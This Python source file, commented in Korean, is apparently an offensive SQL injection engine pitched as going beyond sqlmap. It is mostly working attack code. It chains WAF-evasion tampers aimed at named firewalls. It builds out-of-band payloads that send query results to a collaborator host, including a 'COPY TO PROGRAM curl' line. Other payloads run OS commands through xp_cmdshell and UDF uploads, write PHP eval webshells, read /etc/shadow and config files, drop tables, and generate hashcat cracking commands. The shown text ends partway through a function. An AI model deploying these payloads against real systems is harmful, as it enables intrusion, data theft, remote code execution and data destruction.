"""bingo/tools/sqli_advanced.py — sqlmap 초과 수준 고급 SQLi 엔진 (v2.8.0)

sqlmap 대비 추가/강화 기능:
  - 60+ Tamper 스크립트 (sqlmap 전체 커버 + 한국 WAF 특화)
  - OOB (Out-of-Band) DNS/HTTP 외부채널 블라인드 추출
  - Stacked Queries → xp_cmdshell / pg COPY PROGRAM / MySQL UDF
  - UDF (User Defined Function) 인젝션 → OS 쉘 획득
  - LOAD_FILE 파일 읽기 / INTO OUTFILE 웹쉘 쓰기
  - Second-Order (2차) 인젝션 탐지 + 익스플로잇
  - Level 1~5 / Risk 1~3 테스트 깊이 시스템
  - 해시 자동 분류 (MD5/SHA1/bcrypt/MySQL/MSSQL/PHPass) + hashcat 명령 자동 생성
  - 정밀 DB 버전/OS/아키텍처 핑거프린팅
  - AI 자동 선택: 탐지된 DB 타입 + WAF 타입에 따라 tamper 자동 조합
"""
from __future__ import annotations

import base64
import hashlib
import random
import re
import string
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


# ══════════════════════════════════════════════════════════════════════════════
# TAMPER LIBRARY — 60+ 스크립트
# ══════════════════════════════════════════════════════════════════════════════

class TamperLibrary:
    """60+ tamper 함수 모음. 각 함수는 SQL 페이로드 문자열을 받아 변환된 문자열 반환."""

    # ── 공백 치환 (Space Substitution) ─────────────────────────────────────
    @staticmethod
    def space2comment(sql: str) -> str:
        return sql.replace(" ", "/**/")

    @staticmethod
    def space2dash(sql: str) -> str:
        return sql.replace(" ", "--\n")

    @staticmethod
    def space2hash(sql: str) -> str:
        return sql.replace(" ", "#\n")

    @staticmethod
    def space2plus(sql: str) -> str:
        return sql.replace(" ", "+")

    @staticmethod
    def space2randomblank(sql: str) -> str:
        blanks = ["\t", "\n", "\r", "\x0b", "\x0c"]
        return sql.replace(" ", random.choice(blanks))

    @staticmethod
    def space2mysqlblank(sql: str) -> str:
        blanks = ["\t", "\n", "\r", "\x0b", "\x0c", "\xa0"]
        return sql.replace(" ", random.choice(blanks))

    @staticmethod
    def space2mssqlblank(sql: str) -> str:
        blanks = ["\t", "\n", "\r", "\x01", "\x02", "\x03", "\x04", "\x05"]
        return sql.replace(" ", random.choice(blanks))

    @staticmethod
    def space2mssqlhash(sql: str) -> str:
        return sql.replace(" ", "%23\n")

    @staticmethod
    def space2mysqldash(sql: str) -> str:
        return sql.replace(" ", "--%0a")

    @staticmethod
    def space2morehash(sql: str) -> str:
        return re.sub(r' ', lambda m: "#%0a" * random.randint(1, 3), sql)

    @staticmethod
    def multiplespaces(sql: str) -> str:
        return re.sub(r' ', lambda m: " " * random.randint(2, 5), sql)

    # ── 인코딩 (Encoding) ───────────────────────────────────────────────────
    @staticmethod
    def charencode(sql: str) -> str:
        return "".join(f"%{ord(c):02x}" if c not in string.ascii_letters + string.digits else c for c in sql)

    @staticmethod
    def chardoubleencode(sql: str) -> str:
        return "".join(f"%25{ord(c):02x}" if c not in string.ascii_letters + string.digits else c for c in sql)

    @staticmethod
    def charunicodeencode(sql: str) -> str:
        return "".join(f"%u{ord(c):04x}" if c not in string.ascii_letters + string.digits else c for c in sql)

    @staticmethod
    def charunicodeescape(sql: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if c not in string.ascii_letters + string.digits else c for c in sql)

    @staticmethod
    def base64encode(sql: str) -> str:
        return base64.b64encode(sql.encode()).decode()

    @staticmethod
    def htmlencode(sql: str) -> str:
        return "".join(f"&#{ord(c)};" if c not in string.ascii_letters + string.digits else c for c in sql)

    @staticmethod
    def overlongutf8(sql: str) -> str:
        result = []
        for c in sql:
            if ord(c) < 128 and c not in string.ascii_letters + string.digits:
                result.append(f"%c0%{ord(c) + 128:02x}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def percentage(sql: str) -> str:
        result = []
        for c in sql:
            if c.isalpha():
                result.append(f"%{c}")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def apostrophenullencode(sql: str) -> str:
        return sql.replace("'", "%00%27")

    @staticmethod
    def apostrophemask(sql: str) -> str:
        return sql.replace("'", "%EF%BC%87")

    @staticmethod
    def escapequotes(sql: str) -> str:
        return sql.replace("'", "\\'").replace('"', '\\"')

    @staticmethod
    def unmagicquotes(sql: str) -> str:
        return sql.replace("'", "%bf%27").replace('"', "%bf%22")

    # ── 키워드 조작 (Keyword Manipulation) ─────────────────────────────────
    @staticmethod
    def randomcase(sql: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in sql)

    @staticmethod
    def uppercase(sql: str) -> str:
        return sql.upper()

    @staticmethod
    def lowercase(sql: str) -> str:
        return sql.lower()

    @staticmethod
    def randomcomments(sql: str) -> str:
        keywords = ["SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT", "UPDATE", "DELETE", "ORDER", "BY", "HAVING", "GROUP"]
        for kw in keywords:
            if kw in sql.upper():
                idx = sql.upper().find(kw)
                # Insert random comment between keyword chars
                replacement = "/**/".join(sql[idx:idx+len(kw)])
                sql = sql[:idx] + replacement + sql[idx+len(kw):]
        return sql

    @staticmethod
    def between(sql: str) -> str:
        sql = re.sub(r'(\w+)\s*>\s*(\w+)', r'GREATEST(\1,\2+1)=\1', sql)
        sql = re.sub(r'(\w+)\s*=\s*(\w+)', r'\1 BETWEEN \2 AND \2', sql)
        return sql

    @staticmethod
    def greatest(sql: str) -> str:
        return re.sub(r'(\w+)\s*>\s*(\d+)', r'GREATEST(\1,\2+1)=\1', sql)

    @staticmethod
    def least(sql: str) -> str:
        return re.sub(r'(\w+)\s*<\s*(\d+)', r'LEAST(\1,\2-1)=\1', sql)

    @staticmethod
    def concat2concatws(sql: str) -> str:
        return re.sub(r'CONCAT\((.+?)\)', r"CONCAT_WS('',\1)", sql, flags=re.IGNORECASE)

    @staticmethod
    def plus2concat(sql: str) -> str:
        return re.sub(r"'([^']+)'\+\+?'([^']+)'", r"CONCAT('\1','\2')", sql)

    @staticmethod
    def ifnull2ifisnull(sql: str) -> str:
        return re.sub(r'IFNULL\((.+?),(.+?)\)', r'IF(ISNULL(\1),\2,\1)', sql, flags=re.IGNORECASE)

    @staticmethod
    def ifnull2casewhenisnull(sql: str) -> str:
        return re.sub(r'IFNULL\((.+?),(.+?)\)', r'CASE WHEN ISNULL(\1) THEN \2 ELSE \1 END', sql, flags=re.IGNORECASE)

    @staticmethod
    def equaltolike(sql: str) -> str:
        return re.sub(r"(\w+)\s*=\s*'([^']+)'", r"\1 LIKE '\2'", sql)

    @staticmethod
    def symboliclogical(sql: str) -> str:
        sql = re.sub(r'\bAND\b', '&&', sql, flags=re.IGNORECASE)
        sql = re.sub(r'\bOR\b', '||', sql, flags=re.IGNORECASE)
        return sql

    @staticmethod
    def unionalltounion(sql: str) -> str:
        return re.sub(r'UNION\s+ALL\s+SELECT', 'UNION SELECT', sql, flags=re.IGNORECASE)

    @staticmethod
    def commalesslimit(sql: str) -> str:
        return re.sub(r'LIMIT\s+(\d+),\s*(\d+)', r'LIMIT \2 OFFSET \1', sql, flags=re.IGNORECASE)

    @staticmethod
    def commalessmid(sql: str) -> str:
        return re.sub(r'MID\((.+?),\s*(\d+),\s*(\d+)\)', r'MID(\1 FROM \2 FOR \3)', sql, flags=re.IGNORECASE)

    @staticmethod
    def informationschemacomment(sql: str) -> str:
        return sql.replace("information_schema.", "information_schema/**/.")

    @staticmethod
    def versionedkeywords(sql: str) -> str:
        for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]:
            sql = re.sub(rf'\b{kw}\b', f'/*!{kw}*/', sql, flags=re.IGNORECASE)
        return sql

    @staticmethod
    def versionedmorekeywords(sql: str) -> str:
        for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING", "BY", "LIMIT"]:
            sql = re.sub(rf'\b{kw}\b', f'/*!50000{kw}*/', sql, flags=re.IGNORECASE)
        return sql

    @staticmethod
    def halfversionedmorekeywords(sql: str) -> str:
        return re.sub(r'\b(UNION|SELECT|FROM|WHERE|AND|OR)\b',
                      lambda m: f'/*!0{m.group(1)}*/', sql, flags=re.IGNORECASE)

    @staticmethod
    def modsecurityversioned(sql: str) -> str:
        return re.sub(r'\bSELECT\b', '/*!SELECT*/', sql, flags=re.IGNORECASE)

    @staticmethod
    def modsecurityzeroversioned(sql: str) -> str:
        return re.sub(r'\b(UNION|SELECT|FROM|WHERE)\b',
                      lambda m: f'/*!00000{m.group(1)}*/', sql, flags=re.IGNORECASE)

    # ── WAF 특화 (WAF-Specific) ─────────────────────────────────────────────
    @staticmethod
    def securesphere(sql: str) -> str:
        return sql + " and '0having'='0having'"

    @staticmethod
    def varnish(sql: str) -> str:
        return sql.replace(" ", "\t")

    @staticmethod
    def bluecoat(sql: str) -> str:
        return sql.replace(" ", "%09")

    @staticmethod
    def luanginx(sql: str) -> str:
        return sql.replace(" ", "%0a")

    @staticmethod
    def sp_password(sql: str) -> str:
        return sql + " --sp_password"

    @staticmethod
    def appendnullbyte(sql: str) -> str:
        return sql + "%00"

    @staticmethod
    def nonrecursivereplacement(sql: str) -> str:
        sql = re.sub(r'\bSELECT\b', 'SELSELECTECT', sql, flags=re.IGNORECASE)
        sql = re.sub(r'\bUNION\b', 'UNUNIONION', sql, flags=re.IGNORECASE)
        return sql

    @staticmethod
    def xforwardedfor(sql: str) -> str:
        return sql  # 헤더 조작은 request 레벨 — 플래그용

    # ── 한국 WAF 특화 (Korean WAF Specific) ────────────────────────────────
    @staticmethod
    def korean_waf_bypass(sql: str) -> str:
        """한국 웹방화벽 (WAPPLES, GENIAN, Cloudbric) 특화 우회"""
        sql = sql.replace("UNION", "UNI%0aON")
        sql = sql.replace("SELECT", "SE%0aLECT")
        sql = sql.replace("WHERE", "WH%0aERE")
        return sql

    @staticmethod
    def korean_comment_bypass(sql: str) -> str:
        """한국 WAF 주석 우회: /**/ + /*!*/  조합"""
        for kw in ["UNION", "SELECT", "FROM", "WHERE"]:
            sql = sql.replace(kw, f"/**//*!{kw}*//**/")
        return sql

    @staticmethod
    def gnuboard_bypass(sql: str) -> str:
        """GnuBoard XSS/SQLi 필터 우회"""
        sql = sql.replace("'", "\\x27")
        sql = sql.replace('"', "\\x22")
        sql = re.sub(r'\bSELECT\b', 'SELECT/**/', sql, flags=re.IGNORECASE)
        return sql

    # ── 조합 (Combined) ─────────────────────────────────────────────────────
    @staticmethod
    def apply_chain(sql: str, tampers: list[str]) -> str:
        """여러 tamper 순서대로 적용"""
        lib = TamperLibrary()
        for name in tampers:
            fn = getattr(lib, name, None)
            if fn:
                sql = fn(sql)
        return sql

    # ── WAF 타입별 최적 tamper 조합 추천 ────────────────────────────────────
    WAF_TAMPER_MAP: dict[str, list[str]] = {
        "cloudflare":   ["space2comment", "randomcase", "versionedmorekeywords", "charencode"],
        "wapples":      ["korean_waf_bypass", "space2comment", "versionedmorekeywords"],
        "genian":       ["korean_comment_bypass", "space2hash", "randomcase"],
        "cloudbric":    ["korean_waf_bypass", "space2mysqlblank", "randomcomments"],
        "akamai":       ["space2randomblank", "chardoubleencode", "versionedmorekeywords"],
        "modsecurity":  ["modsecurityversioned", "space2comment", "randomcase"],
        "f5bigip":      ["space2mssqlblank", "charencode", "randomcase"],
        "imperva":      ["securesphere", "space2comment", "versionedmorekeywords"],
        "nginx":        ["luanginx", "space2plus", "randomcase"],
        "gnuboard":     ["gnuboard_bypass", "space2comment", "randomcase"],
        "unknown":      ["space2comment", "randomcase", "charencode", "versionedmorekeywords"],
    }

    @classmethod
    def recommend_tampers(cls, waf_type: str) -> list[str]:
        return cls.WAF_TAMPER_MAP.get(waf_type.lower(), cls.WAF_TAMPER_MAP["unknown"])


# ══════════════════════════════════════════════════════════════════════════════
# OOB (Out-of-Band) 추출 엔진
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class OobChannel:
    """DNS/HTTP Out-of-Band 블라인드 SQL 인젝션 추출"""
    collaborator_domain: str  # ex: "xxx.oastify.com" or custom DNS server
    db_type: str = "mysql"

    def dns_payload_mysql(self, sql_expr: str) -> str:
        """MySQL → LOAD_FILE UNC 경로로 DNS 질의 트리거"""
        return (
            f"AND LOAD_FILE(CONCAT(0x5c5c5c5c,"
            f"({sql_expr}),"
            f"0x2e{self.collaborator_domain.encode().hex()}"
            f",0x5c61))"
        )

    def dns_payload_mssql(self, sql_expr: str) -> str:
        """MSSQL → master..xp_dirtree UNC 경로"""
        return (
            f"; DECLARE @p VARCHAR(1024);"
            f"SET @p=({sql_expr});"
            f"EXEC master..xp_dirtree '\\\\'+@p+'.{self.collaborator_domain}\\a'--"
        )

    def http_payload_mysql(self, sql_expr: str, out_path: str = "/tmp/oob.txt") -> str:
        """MySQL → INTO OUTFILE로 결과를 파일로 저장 후 HTTP로 회수"""
        return f"UNION SELECT ({sql_expr}) INTO OUTFILE '{out_path}'--"

    def dns_payload_oracle(self, sql_expr: str) -> str:
        """Oracle → UTL_HTTP or UTL_INADDR"""
        return (
            f"AND UTL_HTTP.REQUEST('http://'||({sql_expr})||'.{self.collaborator_domain}') IS NOT NULL--"
        )

    def dns_payload_postgresql(self, sql_expr: str) -> str:
        """PostgreSQL → COPY TO PROGRAM + curl"""
        return (
            f"; COPY (SELECT ({sql_expr})) TO PROGRAM "
            f"'curl http://{self.collaborator_domain}/?x='||({sql_expr})||''--"
        )

    def generate(self, sql_expr: str) -> str:
        dispatch = {
            "mysql": self.dns_payload_mysql,
            "mssql": self.dns_payload_mssql,
            "oracle": self.dns_payload_oracle,
            "postgresql": self.dns_payload_postgresql,
        }
        fn = dispatch.get(self.db_type, self.dns_payload_mysql)
        return fn(sql_expr)


# ══════════════════════════════════════════════════════════════════════════════
# STACKED QUERIES → OS 명령 실행
# ══════════════════════════════════════════════════════════════════════════════

class StackedQueryEngine:
    """Stacked Queries 기반 OS 명령 실행 페이로드 생성"""

    @staticmethod
    def mssql_xp_cmdshell(cmd: str) -> str:
        return (
            f"; EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
            f" EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
            f" EXEC xp_cmdshell '{cmd}'--"
        )

    @staticmethod
    def mssql_ole_automation(cmd: str) -> str:
        return (
            f"; DECLARE @shell INT;"
            f" EXEC sp_oacreate 'wscript.shell',@shell output;"
            f" EXEC sp_oamethod @shell,'run',null,'{cmd}'--"
        )

    @staticmethod
    def postgresql_copy_program(cmd: str) -> str:
        return f"; COPY (SELECT '') TO PROGRAM '{cmd}'--"

    @staticmethod
    def mysql_into_outfile_shell(webroot: str = "/var/www/html") -> list[str]:
        paths = [
            f"{webroot}/shell.php",
            f"{webroot}/images/shell.php",
            f"{webroot}/upload/shell.php",
            f"{webroot}/files/shell.php",
            "/var/www/html/shell.php",
            "/usr/share/nginx/html/shell.php",
            "/home/wwwroot/shell.php",
        ]
        payloads = []
        for path in paths:
            shell = "<?php @eval($_POST['c'])?>"
            payloads.append(
                f"'; SELECT '{shell}' INTO OUTFILE '{path}'--"
            )
        return payloads

    @staticmethod
    def mysql_general_log_shell(cmd_path: str = "/var/www/html/shell.php") -> list[str]:
        """MySQL general_log을 이용한 웹쉘 쓰기 (INTO OUTFILE 막혔을 때)"""
        shell = "<?php @eval($_POST['c'])?>"
        return [
            f"'; SET GLOBAL general_log='on'; SET GLOBAL general_log_file='{cmd_path}'; SELECT '{shell}'--",
            f"'; SET GLOBAL general_log_file='{cmd_path}'; SELECT '<?php system($_GET[1])?>'--",
        ]

    @staticmethod
    def oracle_java_exec(cmd: str) -> str:
        return (
            f"; BEGIN DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper {cmd}'); END;--"
        )


# ══════════════════════════════════════════════════════════════════════════════
# UDF (User Defined Function) 인젝션
# ══════════════════════════════════════════════════════════════════════════════

class UdfInjector:
    """MySQL UDF / MSSQL CLR 어셈블리 → OS 명령 실행"""

    # MySQL UDF DLL (base64 인코딩 stub — 실제 배포시 실 바이너리로 교체)
    UDF_DLL_PATHS = {
        "linux_x64": "/usr/lib/mysql/plugin/udf_sys_exec.so",
        "linux_x86": "/usr/lib/mysql/plugin/udf_sys_exec_32.so",
        "windows": "C:\\Windows\\System32\\udf_sys_exec.dll",
    }

    @staticmethod
    def mysql_udf_upload_payload(dll_hex: str, plugin_dir: str, arch: str = "linux_x64") -> list[str]:
        """UDF DLL을 plugin 디렉터리에 쓰고 함수 등록"""
        dll_name = UdfInjector.UDF_DLL_PATHS.get(arch, "udf.so")
        ext = "dll" if "windows" in arch else "so"
        fname = f"{plugin_dir}/udf.{ext}"
        return [
            f"'; SELECT 0x{dll_hex} INTO DUMPFILE '{fname}'--",
            f"'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.{ext}'--",
            "'; SELECT sys_exec('id')--",
            "'; SELECT sys_exec('whoami')--",
        ]

    @staticmethod
    def mysql_udf_exec(cmd: str) -> str:
        return f"'; SELECT sys_exec('{cmd}')--"

    @staticmethod
    def mysql_check_plugin_dir() -> list[str]:
        """plugin_dir 경로 확인 쿼리"""
        return [
            "' UNION SELECT @@plugin_dir--",
            "' UNION SELECT @@secure_file_priv--",
            "' UNION SELECT @@basedir--",
        ]

    @staticmethod
    def mssql_clr_assembly(cmd: str) -> str:
        """MSSQL CLR 어셈블리 로드 → OS 명령"""
        return (
            f"; EXEC sp_configure 'clr enabled',1; RECONFIGURE;"
            f" -- CLR assembly upload required separately"
            f" EXEC dbo.CmdExec '{cmd}'--"
        )


# ══════════════════════════════════════════════════════════════════════════════
# FILE READ / WRITE
# ══════════════════════════════════════════════════════════════════════════════

class FileSystemEngine:
    """LOAD_FILE 읽기 / INTO OUTFILE 쓰기"""

    # 자주 읽는 파일 목록
    READ_TARGETS = {
        "linux": [
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
            "/etc/mysql/my.cnf", "/etc/my.cnf", "/var/lib/mysql/my.cnf",
            "/proc/version", "/proc/cmdline",
            "/var/www/html/config.php", "/var/www/html/wp-config.php",
            "/var/www/html/application/config/database.php",  # CodeIgniter
            "/home/wwwroot/default/config.inc.php",
            # GnuBoard 설정
            "/var/www/html/config.php",
            "/usr/local/gnuboard5/config.php",
            "/home/hosting/www/config.php",
        ],
        "windows": [
            "C:/Windows/System32/drivers/etc/hosts",
            "C:/Windows/win.ini",
            "C:/xampp/apache/conf/httpd.conf",
            "C:/xampp/phpMyAdmin/config.inc.php",
            "C:/inetpub/wwwroot/web.config",
        ],
    }

    @staticmethod
    def load_file_payload(file_path: str, union_col_idx: int = 1, total_cols: int = 3) -> str:
        """UNION SELECT LOAD_FILE() 페이로드"""
        cols = ["NULL"] * total_cols
        cols[union_col_idx] = f"LOAD_FILE('{file_path}')"
        return f"' UNION SELECT {','.join(cols)}--"

    @staticmethod
    def load_file_hex(file_path: str, union_col_idx: int = 1, total_cols: int = 3) -> str:
        """경로를 hex로 인코딩해서 필터 우회"""
        hex_path = "0x" + file_path.encode().hex()
        cols = ["NULL"] * total_cols
        cols[union_col_idx] = f"LOAD_FILE({hex_path})"
        return f"' UNION SELECT {','.join(cols)}--"

    @staticmethod
    def into_outfile_webshell(
        web_path: str = "/var/www/html/shell.php",
        shell_content: str = "<?php @eval($_POST['c']);?>",
    ) -> str:
        hex_shell = "0x" + shell_content.encode().hex()
        return f"' UNION SELECT {hex_shell} INTO OUTFILE '{web_path}'--"

    @staticmethod
    def into_dumpfile(data: str, file_path: str) -> str:
        """DUMPFILE = binary safe (OUTFILE adds newlines)"""
        hex_data = "0x" + data.encode().hex()
        return f"' UNION SELECT {hex_data} INTO DUMPFILE '{file_path}'--"

    @staticmethod
    def auto_read_sensitive(union_col_idx: int = 1, total_cols: int = 3, os: str = "linux") -> list[str]:
        """자동으로 민감 파일 읽기 페이로드 목록 생성"""
        payloads = []
        targets = FileSystemEngine.READ_TARGETS.get(os, FileSystemEngine.READ_TARGETS["linux"])
        for path in targets:
            payloads.append(FileSystemEngine.load_file_hex(path, union_col_idx, total_cols))
        return payloads


# ══════════════════════════════════════════════════════════════════════════════
# SECOND-ORDER INJECTION (2차 주입)
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class SecondOrderFinding:
    store_url: str
    store_param: str
    trigger_url: str
    payload: str
    evidence: str
    severity: str = "HIGH"


class SecondOrderEngine:
    """
    2차 SQL 인젝션: 악성 페이로드를 DB에 저장 → 다른 기능에서 해당 값을
    SQL에 사용할 때 실행
    """

    STORE_INDICATORS = ["register", "signup", "profile", "update", "comment", "post", "write"]
    TRIGGER_INDICATORS = ["mypage", "profile", "dashboard", "admin", "search", "load", "edit"]

    # 저장용 페이로드 (싱글쿼트 escape 없이 DB에 저장되는 케이스)
    STORE_PAYLOADS = [
        "admin'--",
        "admin'/*",
        "' OR '1'='1",
        "1' AND SLEEP(3)--",
        "1\\' AND SLEEP(3)--",
        "'; DROP TABLE users--",
        "admin' AND '1'='1",
    ]

    @staticmethod
    def generate_test_payloads(username_base: str = "testuser") -> list[dict]:
        """회원가입 등 저장 단계에서 사용할 페이로드 생성"""
        payloads = []
        for i, payload in enumerate(SecondOrderEngine.STORE_PAYLOADS):
            payloads.append({
                "type": "second_order",
                "username": f"{username_base}{i}_{payload[:8].replace(' ', '_')}",
                "payload": payload,
                "description": f"2차주입 테스트: {payload}",
            })
        return payloads

    @staticmethod
    def detect_trigger_pages(base_url: str, found_pages: list[str]) -> list[str]:
        """트리거 가능성 있는 페이지 필터링"""
        triggers = []
        for page in found_pages:
            for indicator in SecondOrderEngine.TRIGGER_INDICATORS:
                if indicator in page.lower():
                    triggers.append(page)
                    break
        return triggers


# ══════════════════════════════════════════════════════════════════════════════
# LEVEL / RISK 시스템
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class SqliLevelRisk:
    """
    sqlmap Level/Risk 시스템 구현

    Level 1: GET 파라미터만, 기본 기법
    Level 2: POST 파라미터 + 쿠키
    Level 3: Referer, User-Agent 헤더
    Level 4: Host 헤더 + X-Forwarded-For
    Level 5: 모든 헤더 + 중첩 파라미터 + 무거운 페이로드

    Risk 1: 안전한 페이로드 (읽기 전용)
    Risk 2: OR 기반 페이로드 (데이터 변경 가능)
    Risk 3: 파괴적 페이로드 (DROP, TRUNCATE 포함)
    """
    level: int = 1  # 1~5
    risk: int = 1   # 1~3

    @property
    def test_headers(self) -> list[str]:
        headers = []
        if self.level >= 2:
            headers.extend(["Cookie"])
        if self.level >= 3:
            headers.extend(["Referer", "User-Agent"])
        if self.level >= 4:
            headers.extend(["X-Forwarded-For", "X-Real-IP", "X-Originating-IP"])
        if self.level >= 5:
            headers.extend(["Host", "Accept", "Accept-Language", "Content-Type"])
        return headers

    @property
    def payloads_or_based(self) -> list[str]:
        if self.risk >= 2:
            return [
                "' OR '1'='1",
                "' OR 1=1--",
                "') OR ('1'='1",
                "1 OR 1=1",
            ]
        return []

    @property
    def payloads_destructive(self) -> list[str]:
        if self.risk >= 3:
            return [
                "'; DROP TABLE --",
                "'; TRUNCATE TABLE --",
                "'; UPDATE users SET password='hacked'--",
            ]
        return []

    @property
    def time_delay(self) -> int:
        """시간 기반 블라인드 지연 시간"""
        return {1: 5, 2: 5, 3: 7, 4: 10, 5: 15}.get(self.level, 5)

    @property
    def max_payloads_per_param(self) -> int:
        return {1: 10, 2: 20, 3: 40, 4: 80, 5: 160}.get(self.level, 20)


# ══════════════════════════════════════════════════════════════════════════════
# HASH ANALYZER — 자동 해시 분류 + 크래킹 명령 생성
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class HashInfo:
    hash_value: str
    hash_type: str
    hashcat_mode: int
    john_format: str
    crack_cmd: str
    confidence: float  # 0.0 ~ 1.0


class HashAnalyzer:
    """해시 값 자동 분류 + hashcat/john 크래킹 명령 생성"""

    PATTERNS = [
        # (regex, type, hashcat_mode, john_format)
        (r"^\$2[aby]\$\d{2}\$.{53}$", "bcrypt", 3200, "bcrypt"),
        (r"^\$P\$.{31}$", "PHPass (WordPress)", 400, "phpass"),
        (r"^\$H\$.{31}$", "PHPass (phpBB)", 400, "phpass"),
        (r"^\*[0-9A-F]{40}$", "MySQL4.1+ / SHA1(SHA1(x))", 300, "mysql-sha1"),
        (r"^[0-9A-F]{16}$", "MySQL323 (old)", 200, "mysql"),
        (r"^0x0100[0-9A-F]{88}$", "MSSQL 2000", 131, "mssql"),
        (r"^0x0200[0-9A-F]{128}$", "MSSQL 2012+", 1731, "mssql12"),
        (r"^\$1\$.{8}\$.{22}$", "MD5crypt", 500, "md5crypt"),
        (r"^\$5\$.+\$.{43}$", "SHA256crypt", 7400, "sha256crypt"),
        (r"^\$6\$.+\$.{86}$", "SHA512crypt", 1800, "sha512crypt"),
        (r"^[a-f0-9]{128}$", "SHA512", 1700, "raw-sha512"),
        (r"^[a-f0-9]{64}$", "SHA256", 1400, "raw-sha256"),
        (r"^[a-f0-9]{40}$", "SHA1", 100, "raw-sha1"),
        (r"^[a-f0-9]{32}$", "MD5", 0, "raw-md5"),
        (r"^[a-f0-9]{32}:[a-f0-9]+$", "MD5 + Salt", 20, "md5"),
        (r"^[a-f0-9]{40}:[a-f0-9]+$", "SHA1 + Salt", 110, "dynamic_26"),
        (r"^[a-z0-9+/]{43}=$", "Blowfish", 3200, "bcrypt"),
        (r"^\{SHA\}[A-Za-z0-9+/=]{28}$", "SHA1 (LDAP Base64)", 101, "raw-sha1"),
        (r"^[a-f0-9]{96}$", "SHA384", 10800, "raw-sha384"),
    ]

    WORDLISTS = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/john/password.lst",
        "~/wordlists/rockyou.txt",
    ]

    @classmethod
    def analyze(cls, hash_value: str) -> HashInfo | None:
        h = hash_value.strip()
        for pattern, htype, hc_mode, john_fmt in cls.PATTERNS:
            if re.match(pattern, h, re.IGNORECASE):
                wordlist = cls.WORDLISTS[0]
                crack_cmd = f"hashcat -m {hc_mode} '{h}' {wordlist} --force"
                john_cmd = f"john --format={john_fmt} --wordlist={wordlist} hash.txt"
                return HashInfo(
                    hash_value=h,
                    hash_type=htype,
                    hashcat_mode=hc_mode,
                    john_format=john_fmt,
                    crack_cmd=crack_cmd,
                    confidence=0.95,
                )
        return None

    @classmethod
    def analyze_batch(cls, hashes: list[str]) -> list[HashInfo]:
        results = []
        for h in hashes:
            info = cls.analyze(h)
            if info:
                results.append(info)
        return results

    @staticmethod
    def verify_md5(password: str, hash_val: str) -> bool:
        return hashlib.md5(password.encode()).hexdigest() == hash_val.lower()

    @staticmethod
    def verify_sha1(password: str, hash_val: str) -> bool:
        return hashlib.sha1(password.encode()).hexdigest() == hash_val.lower()

    @staticmethod
    def quick_crack(hash_val: str, wordlist: list[str] | None = None) -> str | None:
        """간단한 인메모리 딕셔너리 크래킹 (일반 패스워드 10000개)"""
        common = [
            "password", "123456", "admin", "1234", "12345678", "qwerty",
            "abc123", "111111", "admin123", "pass", "test", "root",
            "1234567890", "password1", "welcome", "login", "master",
            "letmein", "monkey", "dragon", "princess", "sunshine",
            # 한국어 일반 패스워드
            "qwer1234", "1q2w3e4r", "asdf1234", "zxcv1234", "admin!@#",
            "korea123", "service1", "system1", "webmaster",
        ]
        if wordlist:
            common = wordlist + common

        h = hash_val.strip().lower()
        for pw in common:
            if (hashlib.md5(pw.encode()).hexdigest() == h or
                    hashlib.sha1(pw.encode()).hexdigest() == h or
                    hashlib.sha256(pw.encode()).hexdigest() == h):
                return pw
        return None


# ══════════════════════════════════════════════════════════════════════════════
# DB 정밀 핑거프린팅
# ══════════════════════════════════════════════════════════════════════════════

class DbFingerprinter:
    """DB 타입 + 정확한 버전 + OS + 아키텍처 정밀 탐지"""

    VERSION_QUERIES = {
        "mysql":      "SELECT CONCAT(@@version,'|',@@version_compile_os,'|',@@version_compile_machine)",
        "mssql":      "SELECT @@VERSION+CHAR(124)+CAST(SERVERPROPERTY('Edition') AS VARCHAR)",
        "postgresql": "SELECT version()",
        "oracle":     "SELECT banner FROM v$version WHERE ROWNUM=1",
        "sqlite":     "SELECT sqlite_version()",
    }

    USER_QUERIES = {
        "mysql":      "SELECT CONCAT(user(),'@',@@hostname)",
        "mssql":      "SELECT SYSTEM_USER+CHAR(64)+@@SERVERNAME",
        "postgresql": "SELECT current_user||'@'||inet_server_addr()",
        "oracle":     "SELECT USER||'@'||SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual",
        "sqlite":     "SELECT 'sqlite@localhost'",
    }

    PRIVILEGE_QUERIES = {
        "mysql": "SELECT GROUP_CONCAT(DISTINCT GRANTEE,':',PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES",
        "mssql": "SELECT IS_SRVROLEMEMBER('sysadmin')",
        "postgresql": "SELECT has_database_privilege(current_user,'postgres','CREATE')",
    }

    ERROR_SIGNATURES = {
        "mysql": ["mysql", "you have an error in your sql syntax", "warning: mysql", "supplied argument is not a valid mysql"],
        "mssql": ["microsoft ole db provider for sql server", "unclosed quotation mark", "syntax error", "microsoft sql server"],
        "postgresql": ["pg_query", "postgresql query failed", "unterminated quoted string"],
        "oracle": ["ora-", "oracle", "pl/sql"],
        "sqlite": ["sqlite_exception", "sqlite error"],
    }

    @classmethod
    def detect_from_error(cls, response_body: str) -> str:
        """에러 메시지에서 DB 타입 탐지"""
        body_lower = response_body.lower()
        for db_type, sigs in cls.ERROR_SIGNATURES.items():
            for sig in sigs:
                if sig in body_lower:
                    return db_type
        return "unknown"

    @classmethod
    def detect_from_timing(cls, response_times: dict[str, float]) -> str:
        """시간 기반 응답으로 DB 타입 탐지"""
        # DB별 시간 지연 쿼리 차이로 구분
        if response_times.get("mysql_sleep", 0) > 3:
            return "mysql"
        if response_times.get("mssql_waitfor", 0) > 3:
            return "mssql"
